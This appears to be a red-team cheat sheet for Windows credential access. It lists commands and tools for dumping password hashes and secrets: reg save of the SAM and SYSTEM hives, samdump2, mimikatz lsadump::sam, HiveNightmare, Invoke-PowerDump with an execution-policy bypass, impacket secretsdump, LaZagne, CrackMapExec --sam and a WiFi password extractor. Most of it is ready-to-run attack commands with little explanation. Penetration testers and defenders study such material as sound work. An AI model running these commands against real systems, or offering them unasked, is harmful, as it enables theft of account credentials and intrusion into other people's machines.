# Credential Access

The adversary is trying to steal account names and passwords.

### Dumping Hashes

List of loots to collect
- [ ] Manually

  ```
    reg save hklm\sam C:\Users\Public\sam
    reg save hklm\system C:\Users\Public\system
  ```
  Once you have retrieved the data from SAM, you can use SamDump2 tool to dump its hashes with the following command
  
  `samdump2 system sam`
  
- [ ] Mimikats
  - binaries https://github.com/ParrotSec/mimikatz
  - project https://github.com/gentilkiwi/mimikatz
  - mimikatz cheatsheet https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49
  
  ```
  privilege::debug
  token::elevate
  lsadump::sam
  ```
  
- [ ] Pypykatz
  - Project https://github.com/skelsec/pypykatz
  - Demo https://www.youtube.com/watch?v=X4YCJYQ-zVg
 
- [ ] Nightmare Hive
  - Exploit allowing you to read any registry hives as non-admin.
  - https://github.com/GossiTheDog/HiveNightmare/tree/master/Release

- [ ] PwDump7
  - Only for Windows7
  - https://www.tarasco.org/security/pwdump_7/pwdump7.zip

- [ ] Powershell Script
  - https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1
  - `powershell.exe -exec bypass -Command "& {Import-Module .\Invoke-PowerDump.ps1; Invoke-PowerDump}"`


- [ ] Impacket
  - `./secretsdump.py -sam /root/Desktop/sam -system /root/Desktop/system LOCAL`

- [ ] lazagne.exe
  - project https://github.com/AlessandroZ/LaZagne
  - binaries https://github.com/AlessandroZ/LaZagne/releases/
  - `lazagne.exe all`

- [ ] CrackMapExec 
  - `crackmapexec smb 192.168.1.105 -u 'AdministratorUsername' -p 'password1234' --sam`
  
  
### WiFi Credentials

   - [ ] Windows WiFi Password Extractor
     - https://github.com/hmaverickadams/Windows-WiFi-Extractor
     
### References
- https://www.hackingarticles.in/credential-dumping-sam/
